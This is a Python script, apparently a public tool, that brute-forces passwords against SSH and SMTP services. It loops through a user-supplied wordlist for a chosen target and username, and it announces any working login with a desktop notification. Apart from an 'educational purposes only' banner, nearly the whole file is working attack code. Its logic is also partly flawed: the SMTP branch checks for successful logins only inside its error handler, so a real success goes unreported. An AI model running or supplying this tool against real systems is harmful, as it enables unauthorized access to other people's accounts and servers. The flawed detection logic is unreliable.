#!/usr/bin/env python3

import os
from colorama import Fore
from plyer import notification

red = Fore.RED
yellow = Fore.YELLOW
white = Fore.WHITE
green = Fore.GREEN

def clear():
    os.system("clear")

def brute_ssh():
    try:
        import paramiko
        import socket

    except ImportError:
        print("Paramiko or socket module is not installed, please retry")
        exit()

    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    target = input(white + "\nEnter target ip address: ")
    user = input("Enter ssh username to test: ")
    path_input = input("Enter path to wordlist: ")
    wordlist = input("Enter wordlist name: ")

    path = os.path.join(path_input, wordlist) # set path to file

    try:
        with open(path, "r") as passw: # read given wordlist
            passwords = [passwd.strip() for passwd in passw]
            
    except FileNotFoundError:
        print(red + "Wordlist not found, please retry")
        exit()

    for passwd in passwords:
        try:
            print(f"{user} {passwd}")
            client.connect(target, port=22, username=user, password=passwd, timeout=20, banner_timeout=5) # try to connect
            print(green + "Login found : " + red + f"{user} {passwd}")
            print(green + "Target : " + red + f"{target}" + green + " port : 22\n")
            notification.notify(title="SSH Bruteforce", message="Login found, check your shell")
            client.close()
            exit()

        except paramiko.AuthenticationException: # retry a new authentification
            continue

        except (paramiko.SSHException, socket.error) as e:
            print(red + f"SHH error, cannot connect : {e}")
            exit()

        except socket.timeout:
            print(red + f"Server {target} is not responding, try again later")
            exit()

        except KeyboardInterrupt:
            print("\nAbort.")
            exit()

        except Exception as e:
            clear()
            print(red + f"Unexpected error : {e}")
            exit()

    client.close()
    exit()


def brute_smtp():
    try:
        import smtplib

    except ImportError:
        print("Module smtplib is not installed, please retry")
        exit()

    url = input(white + "\nEnter target SMTP url (e.g. smtp.gmail.com): ")
    user = input("Enter email address to test: ")
    path_input = input("Enter path to wordlist: ")
    wordlist = input("Enter wordlist name: ")

    path = os.path.join(path_input, wordlist) # set path to file

    try:
        with open(path, "r") as passw: # read given wordlist
            passwords = [passwd.strip() for passwd in passw]
            
    except FileNotFoundError:
        print(red + "Wordlist not found, please retry")
        exit()

    for passwd in passwords:
        with smtplib.SMTP(url, 587) as target: # connection made on port 587 for TLS
            try:
                print(f"{user} {passwd}")
                target.ehlo()
                target.starttls()
                target.login(user, passwd)
                    
            except smtplib.SMTPConnectError as e:
                target.quit()
                print("An error occured during the establishement")
                print(f"of the connection, please retry later: {e}")
                exit()

            except (smtplib.SMTPResponseException, smtplib.SMTPAuthenticationError) as e:
                login = str(e)
                print(login)
                if login[:4] == "(250" or login[:4] == "(235":
                    print(green + "Login found : " + red + f"{user} {passwd}\n")
                    notification.notify(title="SMTP Bruteforce", message="Login found, check your shell")
                    target.quit()
                    exit()

                else:
                    continue # retry a new authentification

            except KeyboardInterrupt:
                target.quit()
                print("\nAbort.")
                exit()

            except Exception as e:
                target.quit()
                print(f"Unexpected error : {e}")
                exit()


banner = red + r"""This tool is for eductational purposes only !
Do not use for illegal or unethical activity.
For any problems, please refer to the README.md
  __  __  ____ ___
 |  \/  |/ __/| _ )
 | |\/| |\__ \| _ \
 |_|  |_|/___/|___/ """ + yellow + """by eur0pium

 Multi-Services Bruteforcer
 
 My Github : https://github.com/zephir74
"""

clear()

print(banner)

choice = input(white + "Enter service to bruteforce [ssh/SMTP]: ")

if choice == "ssh":
    brute_ssh()
    

elif choice == "SMTP":
    brute_smtp()

else:
    print(f"Invalid input {choice}, please retry")
    exit()
